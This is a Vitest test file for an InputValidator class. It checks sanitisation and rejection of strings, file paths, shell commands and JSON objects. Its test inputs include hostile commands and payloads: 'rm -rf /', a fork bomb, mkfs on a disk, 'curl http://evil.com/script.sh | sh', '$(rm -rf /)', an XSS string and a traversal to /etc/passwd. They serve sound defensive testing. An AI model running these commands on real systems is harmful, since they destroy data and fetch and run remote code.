import { describe, it, expect } from 'vitest'
import { InputValidator } from '../../security/InputValidator'

describe('InputValidator', () => {
  const validator = new InputValidator()

  describe('validateString', () => {
    it('rejects non-string values', () => {
      const result = validator.validateString(123)
      expect(result.valid).toBe(false)
      expect(result.errors).toContain('Value must be a string')
    })

    it('rejects empty string by default', () => {
      const result = validator.validateString('')
      expect(result.valid).toBe(false)
      expect(result.errors).toContain('Value cannot be empty')
    })

    it('allows empty string when allowEmpty is true', () => {
      const result = validator.validateString('', { allowEmpty: true })
      expect(result.valid).toBe(true)
    })

    it('enforces minLength', () => {
      const result = validator.validateString('ab', { minLength: 3 })
      expect(result.valid).toBe(false)
      expect(result.errors.some(e => e.includes('at least 3'))).toBe(true)
    })

    it('enforces maxLength', () => {
      const result = validator.validateString('abcdef', { maxLength: 3 })
      expect(result.valid).toBe(false)
      expect(result.errors.some(e => e.includes('at most 3'))).toBe(true)
    })

    it('enforces pattern', () => {
      const result = validator.validateString('abc123', { pattern: /^[a-z]+$/ })
      expect(result.valid).toBe(false)
      expect(result.errors).toContain('Value does not match required pattern')
    })

    it('sanitizes control characters and javascript: protocol', () => {
      const result = validator.validateString('hello\x00world<script>javascript:alert(1)</script>')
      expect(result.valid).toBe(true)
      expect(result.sanitized).not.toContain('\x00')
      expect(result.sanitized).not.toContain('javascript:')
    })
  })

  describe('validateFilePath', () => {
    it('rejects empty path', () => {
      const result = validator.validateFilePath('')
      expect(result.valid).toBe(false)
      expect(result.errors).toContain('Path cannot be empty')
    })

    it('rejects path traversal with ..', () => {
      const result = validator.validateFilePath('../../etc/passwd')
      expect(result.valid).toBe(false)
      expect(result.errors.some(e => e.includes('Path traversal'))).toBe(true)
    })

    it('rejects paths with dangerous characters', () => {
      const result = validator.validateFilePath('file<name>.txt')
      expect(result.valid).toBe(false)
      expect(result.errors).toContain('Path contains dangerous characters')
    })

    it('rejects Windows reserved names', () => {
      const result = validator.validateFilePath('CON.txt')
      expect(result.valid).toBe(false)
      expect(result.errors).toContain('Path uses reserved Windows name')
    })

    it('allows safe relative paths', () => {
      const result = validator.validateFilePath('src/index.ts')
      expect(result.valid).toBe(true)
    })
  })

  describe('validateCommand', () => {
    it('rejects empty command', () => {
      const result = validator.validateCommand('')
      expect(result.valid).toBe(false)
      expect(result.errors).toContain('Command cannot be empty')
    })

    it('rejects rm -rf /', () => {
      const result = validator.validateCommand('rm -rf /')
      expect(result.valid).toBe(false)
      expect(result.errors.some(e => e.includes('从根目录递归删除'))).toBe(true)
    })

    it('rejects fork bomb', () => {
      const result = validator.validateCommand(':(){ :|:& };:')
      expect(result.valid).toBe(false)
      expect(result.errors.some(e => e.includes('fork 炸弹'))).toBe(true)
    })

    it('rejects mkfs', () => {
      const result = validator.validateCommand('mkfs.ext4 /dev/sda1')
      expect(result.valid).toBe(false)
      expect(result.errors.some(e => e.includes('文件系统格式化'))).toBe(true)
    })

    it('rejects curl pipe sh', () => {
      const result = validator.validateCommand('curl http://evil.com/script.sh | sh')
      expect(result.valid).toBe(false)
      expect(result.errors.some(e => e.includes('远程执行代码'))).toBe(true)
    })

    it('rejects command injection with dollar sign', () => {
      const result = validator.validateCommand('$(rm -rf /)')
      expect(result.valid).toBe(false)
      expect(result.errors.some(e => e.includes('command injection'))).toBe(true)
    })

    it('allows safe commands', () => {
      const result = validator.validateCommand('echo hello world')
      expect(result.valid).toBe(true)
    })
  })

  describe('validateJSON', () => {
    it('rejects non-object values', () => {
      const result = validator.validateJSON('not an object', {})
      expect(result.valid).toBe(false)
      expect(result.errors).toContain('Value must be an object')
    })

    it('rejects missing required fields', () => {
      const result = validator.validateJSON(
        { name: 'test' },
        { name: { required: true, type: 'string' }, age: { required: true, type: 'number' } }
      )
      expect(result.valid).toBe(false)
      expect(result.errors).toContain('Missing required field: age')
    })

    it('rejects wrong type', () => {
      const result = validator.validateJSON(
        { age: 'twenty' },
        { age: { required: true, type: 'number' } }
      )
      expect(result.valid).toBe(false)
      expect(result.errors.some(e => e.includes('must be of type number'))).toBe(true)
    })

    it('enforces maxLength on string fields', () => {
      const result = validator.validateJSON(
        { name: 'verylongname' },
        { name: { maxLength: 5 } }
      )
      expect(result.valid).toBe(false)
      expect(result.errors.some(e => e.includes('exceeds max length'))).toBe(true)
    })

    it('passes valid object', () => {
      const result = validator.validateJSON(
        { name: 'test', age: 25 },
        { name: { required: true, type: 'string' }, age: { type: 'number' } }
      )
      expect(result.valid).toBe(true)
    })
  })
})
